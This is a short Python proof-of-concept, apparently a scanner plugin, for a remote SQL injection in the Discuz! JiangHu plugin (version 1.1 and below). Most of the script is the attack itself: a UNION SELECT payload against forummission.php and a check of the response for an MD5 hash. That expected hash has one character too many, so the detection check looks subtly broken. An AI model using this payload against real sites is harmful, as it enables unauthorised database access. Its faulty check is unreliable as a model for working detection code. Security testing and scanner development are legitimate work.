#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'K0thony'
# Discuz! JiangHu plugin versions 1.1 and below remote SQL injection


def assign(service, arg):
    if service == "discuz":
        return True, arg


def audit(arg):
    payload = 'forummission.php?index=show&id=24%20and+1=2+union+select+1,2,md5(12345),4,5,6,7,8,9,10,11--'
    verify_url = arg + payload
    code, head, res, errcode, _ = curl.curl(verify_url)
    if code == 200 and "827ccb0eea8a706c4c34a16891f84e7b1" in res:
        security_hole(verify_url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('discuz','http://www.example.com/')[1])